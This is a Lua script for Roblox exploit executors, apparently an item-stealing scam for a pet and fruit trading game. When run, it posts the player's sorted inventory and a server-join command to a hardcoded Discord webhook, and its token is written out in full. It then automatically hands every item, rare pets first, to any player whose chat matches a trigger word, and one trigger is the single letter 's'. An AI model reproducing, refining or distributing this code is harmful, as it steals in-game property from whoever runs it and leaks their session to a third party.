-- Services
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local Camera = workspace.CurrentCamera
local VirtualInputManager = game:GetService("VirtualInputManager")
local TeleportService = game:GetService("TeleportService")
local RunService = game:GetService("RunService")

-- Configuration
local WEBHOOK_URL = "https://discord.com/api/webhooks/1393445006299234449/s32t5PInI1pwZmxL8VTTmdohJ637DT_i6ni1KH757iQwNpxfbGcBamIzVSWWfn0jP8Rg"
local RARE_PETS = {"T-Rex", "Dragonfly", "Raccoon", "Mimic Octopus", "Butterfly", "Disco bee", "Queen bee"}
local TRIGGER_WORDS = {"s", "give", "items", "trade", LocalPlayer.Name:lower()} -- Words that trigger the item giving

-- Item patterns
local FRUIT_PATTERN = "%[(.-)%]%s(.+)%s%[(%d+%.%d+)kg%]"
local PET_PATTERN = "(.+)%s%[(%d+%.%d+)%sKG%]%s%[Age%s(%d+)%]"

-- Current tool tracking
local currentTool = nil
local toolRemovedConn = nil

-- Monitor tool removal
local function monitorToolRemoval()
    if toolRemovedConn then
        toolRemovedConn:Disconnect()
    end
    
    if LocalPlayer.Character then
        toolRemovedConn = LocalPlayer.Character.ChildRemoved:Connect(function(child)
            if child == currentTool then
                currentTool = nil
            end
        end)
    end
end

-- Inventory scanner with priority sorting
local function scanInventory(player)
    local fruits = {}
    local pets = {}
    
    for _, item in pairs(player.Backpack:GetChildren()) do
        local name = item.Name
        
        -- Parse fruits
        local fruitTraits, fruitName, fruitWeight = name:match(FRUIT_PATTERN)
        if fruitName then
            local traitCount = select(2, fruitTraits:gsub(",", ",")) + 1
            table.insert(fruits, {
                name = name,
                item = item,
                traits = fruitTraits,
                traitCount = traitCount,
                weight = tonumber(fruitWeight)
            })
        
        -- Parse pets
        else
            local petName, petWeight, petAge = name:match(PET_PATTERN)
            if petName then
                local isRare = false
                for _, rarePet in pairs(RARE_PETS) do
                    if petName:find(rarePet) then
                        isRare = true
                        break
                    end
                end
                
                table.insert(pets, {
                    name = name,
                    item = item,
                    weight = tonumber(petWeight),
                    age = tonumber(petAge),
                    isRare = isRare
                })
            end
        end
    end
    
    -- Sort pets (rare > weight > age)
    table.sort(pets, function(a, b)
        if a.isRare ~= b.isRare then
            return a.isRare
        elseif a.weight ~= b.weight then
            return a.weight > b.weight
        else
            return a.age > b.age
        end
    end)
    
    -- Sort fruits (trait count > weight)
    table.sort(fruits, function(a, b)
        if a.traitCount ~= b.traitCount then
            return a.traitCount > b.traitCount
        else
            return a.weight > b.weight
        end
    end)
    
    return pets, fruits
end

-- Send MY inventory to Discord
local function sendMyInventory()
    local pets, fruits = scanInventory(LocalPlayer)
    
    -- Format pets
    local petList = {}
    for _, pet in ipairs(pets) do
        table.insert(petList, pet.name .. (pet.isRare and " ★" or ""))
    end
    
    -- Format fruits
    local fruitList = {}
    for _, fruit in ipairs(fruits) do
        table.insert(fruitList, fruit.name)
    end
    
    local embed = {
        title = "📦 "..LocalPlayer.Name.."'s Inventory",
        description = "Say any of these in chat to receive items: `"..table.concat(TRIGGER_WORDS, "`, `").."`",
        color = 0x00FF00,
        fields = {
            {
                name = "🐾 Pets ("..#pets..")",
                value = #pets > 0 and "```"..table.concat(petList, "\n").."```" or "```None```",
                inline = true
            },
            {
                name = "🍇 Fruits ("..#fruits..")",
                value = #fruits > 0 and "```"..table.concat(fruitList, "\n").."```" or "```None```",
                inline = true
            },
            {
                name = "🔗 Join Server",
                value = string.format('```lua\ngame:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s")\n```', 
                    game.PlaceId, game.JobId),
                inline = false
            }
        }
    }
    
    -- Try different webhook methods
    local success, err = pcall(function()
        local json = HttpService:JSONEncode({embeds = {embed}})
        if syn and syn.request then
            syn.request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = json
            })
        elseif request then
            request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = json
            })
        else
            HttpService:PostAsync(WEBHOOK_URL, json)
        end
    end)
    
    if not success then
        warn("Webhook failed:", err)
    else
        print("✅ Inventory sent to Discord!")
    end
end

-- Teleport to player and face them
local function teleportToPlayer(targetPlayer)
    local targetChar = targetPlayer.Character or targetPlayer.CharacterAdded:Wait()
    local myChar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local humanoid = myChar:FindFirstChildOfClass("Humanoid")
    if not humanoid then return end

    -- Position in front of target
    humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
    
    local targetCFrame = targetChar:GetPrimaryPartCFrame()
    local offset = targetCFrame.LookVector * -3 -- 3 studs in front
    myChar:SetPrimaryPartCFrame(CFrame.new(targetCFrame.Position + offset + Vector3.new(0, 3, 0), targetCFrame.Position))
    
    -- Face the target
    task.wait(0.5)
    humanoid:MoveTo(targetCFrame.Position)
end

-- Give items to the requesting player
local function giveItemsToPlayer(targetPlayer)
    local targetChar = targetPlayer.Character or targetPlayer.CharacterAdded:Wait()
    local myChar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local humanoid = myChar:FindFirstChildOfClass("Humanoid")
    if not humanoid then return end

    -- Get MY sorted inventory
    local pets, fruits = scanInventory(LocalPlayer)
    local allItems = {}
    
    -- Add pets first
    for _, pet in ipairs(pets) do
        table.insert(allItems, pet.item)
    end
    
    -- Then add fruits
    for _, fruit in ipairs(fruits) do
        table.insert(allItems, fruit.item)
    end
    
    if #allItems == 0 then
        print("⚠️ No items to give!")
        return
    end
    
    -- Teleport to player first
    teleportToPlayer(targetPlayer)
    task.wait(1)
    
    -- Process each item
    for _, item in ipairs(allItems) do
        -- Equip the item
        humanoid:EquipTool(item)
        currentTool = item
        monitorToolRemoval()
        task.wait(0.5)
        
        -- Click and hold until item disappears from MY inventory
        local viewport = Camera.ViewportSize
        local center = Vector2.new(viewport.X/2, viewport.Y/2)
        
        VirtualInputManager:SendMouseButtonEvent(center.X, center.Y, 0, true, game, 1)
        
        -- Wait until item is gone (max 10 seconds)
        local startTime = os.clock()
        while currentTool ~= nil and (os.clock() - startTime < 10) do
            task.wait(0.1)
        end
        
        VirtualInputManager:SendMouseButtonEvent(center.X, center.Y, 0, false, game, 1)
        
        -- If still equipped, unequip manually
        if currentTool then
            humanoid:UnequipTools()
            currentTool = nil
        end
        
        task.wait(1) -- Brief cooldown
    end
    
    print("✅ All items given to", targetPlayer.Name)
end

-- Chat handler
local function onPlayerChatted(player, message)
    if player == LocalPlayer then return end
    
    -- Check for trigger words
    local lowerMsg = message:lower()
    local shouldTrigger = false
    
    for _, word in ipairs(TRIGGER_WORDS) do
        if lowerMsg:match(word) then
            shouldTrigger = true
            break
        end
    end
    
    if not shouldTrigger then return end
    
    print("📢 Trigger word detected from", player.Name)
    giveItemsToPlayer(player)
end

-- Initialize
local function main()
    -- Wait for everything to load
    repeat task.wait() until LocalPlayer.Character
    LocalPlayer.Backpack:WaitForChild("ChildAdded", 10)
    
    -- Send MY inventory to Discord
    sendMyInventory()
    
    -- Setup chat listeners
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            player.Chatted:Connect(function(msg)
                onPlayerChatted(player, msg)
            end)
        end
    end
    
    Players.PlayerAdded:Connect(function(player)
        player.Chatted:Connect(function(msg)
            onPlayerChatted(player, msg)
        end)
    end)
    
    print("✅ Item Giver Active! Waiting for trigger words...")
    print("Trigger words:", table.concat(TRIGGER_WORDS, ", "))
end

-- Error handling and retry
local function safeMain()
    local success, err = pcall(main)
    if not success then
        warn("Initial error:", err)
        task.wait(5)
        pcall(main) -- Try again after delay
    end
end

-- Start the script
safeMain()
